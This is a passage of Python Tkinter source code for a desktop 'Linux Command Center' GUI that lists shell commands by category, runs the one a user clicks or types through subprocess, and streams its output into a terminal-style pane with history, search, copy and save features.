        self._write(f"  Date/Time  : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n", "dim")
        self._write(f"  Categories : {len(COMMANDS)}   •   Commands : {total}\n", "dim")
        self._write("\n", "output")
        self._write("  ► Left sidebar is SCROLLABLE — scroll down to see all categories & quick actions.\n", "dim")
        self._write("  ► Click any command to run it. # commands load as templates to edit.\n", "dim")
        self._write("  ► ⧉ button on each command copies it to clipboard.\n", "dim")
        self._write("  ► Ctrl+H → Shortcuts  |  Ctrl+L → Clear  |  Ctrl+S → Save  |  F5 → Refresh\n", "dim")
        self._write("  ► ↑/↓ in command bar = history navigation.  Tab = path autocomplete.\n", "dim")
        self._write("\n", "output")
        self._write("  " + "─" * 68 + "\n", "dim")
        self._write("\n", "output")

    # ─────────────────────────────────────────────────────────
    def _show_category(self, cat_name):
        self.current_category = cat_name
        cat = COMMANDS[cat_name]
        for n, btn in self.cat_buttons.items():
            if n == cat_name:
                btn.config(bg=THEME["selected"], fg=cat["color"],
                           font=font.Font(family="Courier New", size=10, weight="bold"))
            else:
                btn.config(bg=THEME["bg2"], fg=THEME["text_dim"], font=self.f_cat)
        self.cat_title_var.set(f"  {cat_name}")
        self.search_var.set("")
        self._render_commands(cat["commands"], cat["color"])

    def _render_commands(self, commands, color=None):
        for w in self.cmd_inner.winfo_children():
            w.destroy()
        self.command_buttons.clear()
        self._cmd_canvas.yview_moveto(0)

        cat  = COMMANDS.get(self.current_category, {})
        col  = color or cat.get("color", THEME["accent"])
        self.cmd_count_var.set(f"  {len(commands)} commands")

        for i, (label, cmd) in enumerate(commands):
            is_tmpl = cmd.strip().startswith("#")
            row_bg  = THEME["bg3"] if i % 2 == 0 else THEME["panel"]

            row = tk.Frame(self.cmd_inner, bg=row_bg, cursor="hand2")
            row.pack(fill="x")
            row.bind("<MouseWheel>", self._cmd_mw)
            row.bind("<Button-4>",  self._cmd_mw)
            row.bind("<Button-5>",  self._cmd_mw)

            # Color strip
            tk.Frame(row, width=3,
                     bg=col if not is_tmpl else THEME["text_dim"]
                     ).pack(side="left", fill="y")

            inner = tk.Frame(row, bg=row_bg)
            inner.pack(fill="x", padx=10, pady=6, side="left", expand=True)
            inner.bind("<MouseWheel>", self._cmd_mw)
            inner.bind("<Button-4>",  self._cmd_mw)
            inner.bind("<Button-5>",  self._cmd_mw)

            lbl_w = tk.Label(inner, text=label, font=self.f_cmd, bg=row_bg,
                             fg=THEME["text"] if not is_tmpl else THEME["text_dim"],
                             anchor="w")
            lbl_w.pack(anchor="w")
            lbl_w.bind("<MouseWheel>", self._cmd_mw)

            preview = cmd.strip()[:90] + ("…" if len(cmd.strip()) > 90 else "")
            prev_w = tk.Label(inner, text=preview, font=self.f_small, bg=row_bg,
                              fg=col if not is_tmpl else THEME["text_dim"],
                              anchor="w")
            prev_w.pack(anchor="w")
            prev_w.bind("<MouseWheel>", self._cmd_mw)

            # Copy button
            cp_btn = tk.Button(
                row, text="⧉", font=self.f_small, bg=row_bg,
                fg=THEME["text_dim"], relief="flat", cursor="hand2", padx=5,
                command=lambda c=cmd: self._copy_to_clipboard(c)
            )
            cp_btn.pack(side="right", padx=(0, 6))
            cp_btn.bind("<MouseWheel>", self._cmd_mw)

            def on_click(e, c=cmd, lbl=label):
                self._on_command_click(c, lbl)

            for w2 in (row, inner, lbl_w, prev_w):
                w2.bind("<Button-1>", on_click)

            orig = row_bg
            def on_enter(e, r=row, c2=col):
                r.config(bg=THEME["hover"])
                for ch in r.winfo_children():
                    try: ch.config(bg=THEME["hover"])
                    except: pass
            def on_leave(e, r=row, ob=orig):
                r.config(bg=ob)
                for ch in r.winfo_children():
                    try: ch.config(bg=ob)
                    except: pass
            row.bind("<Enter>", on_enter)
            row.bind("<Leave>", on_leave)

            self.command_buttons.append((label, cmd, row))

    def _filter_commands(self, *_):
        q = self.search_var.get().lower()
        if not q:
            if self.current_category:
                cat = COMMANDS[self.current_category]
                self._render_commands(cat["commands"], cat["color"])
            return
        results = []
        for cat_name, cat in COMMANDS.items():
            for label, cmd in cat["commands"]:
                if q in label.lower() or q in cmd.lower():
                    tag = cat_name.split()[-1]
                    results.append((f"[{tag}] {label}", cmd))
        self._render_commands(results, THEME["accent"])
        self.cmd_count_var.set(f"  {len(results)} results")

    # ─────────────────────────────────────────────────────────
    def _copy_to_clipboard(self, text):
        self.clipboard_clear()
        self.clipboard_append(text.strip().lstrip("# ").strip())
        self._write("\n  ⧉  Copied to clipboard.\n", "info")

    def _copy_output(self):
        content = self.terminal.get("1.0", tk.END)
        self.clipboard_clear()
        self.clipboard_append(content)
        self._write("\n  📋 Terminal output copied to clipboard.\n", "success")

    # ─────────────────────────────────────────────────────────
    def _on_command_click(self, cmd, label):
        if cmd.strip().startswith("#"):
            self.cmd_entry.delete(0, tk.END)
            self.cmd_entry.insert(0, cmd.strip().lstrip("# ").strip())
            self.cmd_entry.focus_set()
            self._write(f"\n  ✏  Template loaded: {label}\n", "info")
        else:
            self._run_command(cmd, label)

    def _run_command(self, cmd, label=None):
        if self.running_process:
            try: self.running_process.kill()
            except: pass

        self._write(f"\n{'─'*72}\n", "dim")
        if label:
            self._write(f"  ▶  {label}\n", "header")
        self._write(f"  $ {cmd[:120]}{'...' if len(cmd) > 120 else ''}\n", "cmd")
        self._write(f"  {datetime.datetime.now().strftime('%H:%M:%S')}\n", "dim")
        self._write(f"{'─'*72}\n\n", "dim")

        self.history.append(cmd)
        self.history_index = len(self.history)
        self.status_var.set("● Running…")
        threading.Thread(target=self._exec, args=(cmd,), daemon=True).start()

    def _exec(self, cmd):
        try:
            proc = subprocess.Popen(
                cmd, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, encoding="utf-8", errors="replace"
            )
            self.running_process = proc
            for line in iter(proc.stdout.readline, ""):
                self._write(line, "output")
            proc.wait()
            rc = proc.returncode
            self._write(f"\n  {'✓' if rc == 0 else '✗'} Exit code: {rc}\n",
                        "success" if rc == 0 else "error")
        except Exception as e:
            self._write(f"\n  ✗ Error: {e}\n", "error")
        finally:
            self.running_process = None
            self.after(0, lambda: self.status_var.set("● Ready"))

    def _run_custom_command(self, event=None):
        cmd = self.cmd_entry.get().strip()
        if cmd:
            self.cmd_entry.delete(0, tk.END)
            self._run_command(cmd)

    def _stop_process(self):
        if self.running_process:
            try:
                self.running_process.kill()
                self._write("\n  ■ Process stopped.\n", "error")
            except: pass
            self.running_process = None
            self.status_var.set("● Ready")

    # ─────────────────────────────────────────────────────────
    def _write(self, text, tag="output"):
        def _do():
            self.terminal.configure(state="normal")
            self.terminal.insert(tk.END, text, tag)
            self.terminal.configure(state="disabled")
            self.terminal.see(tk.END)
        self.after(0, _do)

    def _clear_output(self):
        self.terminal.configure(state="normal")
        self.terminal.delete("1.0", tk.END)
        self.terminal.configure(state="disabled")
        self._print_welcome()

    def _save_output(self):
        ts   = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.expanduser(f"~/lcc_output_{ts}.txt")
        try:
            with open(path, "w") as f:
                f.write(self.terminal.get("1.0", tk.END))
            self._write(f"\n  💾 Saved to: {path}\n", "success")
        except Exception as e:
            self._write(f"\n  ✗ Save failed: {e}\n", "error")

    # ─────────────────────────────────────────────────────────
    def _history_up(self, event):
        if self.history and self.history_index > 0:
            self.history_index -= 1
            self.cmd_entry.delete(0, tk.END)
            self.cmd_entry.insert(0, self.history[self.history_index])
        return "break"

    def _history_down(self, event):
        if self.history_index < len(self.history) - 1:
            self.history_index += 1
            self.cmd_entry.delete(0, tk.END)
            self.cmd_entry.insert(0, self.history[self.history_index])
        else:
            self.history_index = len(self.history)
            self.cmd_entry.delete(0, tk.END)
        return "break"

    def _tab_complete(self, event):
        cur = self.cmd_entry.get()
        tokens = cur.split()
        if tokens:
            last = tokens[-1]
            try:
                matches = glob.glob(last + "*")
                if len(matches) == 1:
                    tokens[-1] = matches[0]
                    self.cmd_entry.delete(0, tk.END)
                    self.cmd_entry.insert(0, " ".join(tokens))
                elif len(matches) > 1:
                    self._write("\n  " + "   ".join(matches[:12]) + "\n", "dim")
            except: pass
        return "break"

    # ─────────────────────────────────────────────────────────
    def _start_status_thread(self):
        def loop():
            while True:
                try:
                    now = datetime.datetime.now().strftime("%Y-%m-%d  %H:%M:%S")
                    self.after(0, lambda n=now: self.sysinfo_var.set(
                        f"  {platform.node()}  |  {n}  "
                    ))
                except: pass
                time.sleep(1)
        threading.Thread(target=loop, daemon=True).start()


# ─────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    app = LinuxCommandCenter()
    app.mainloop()
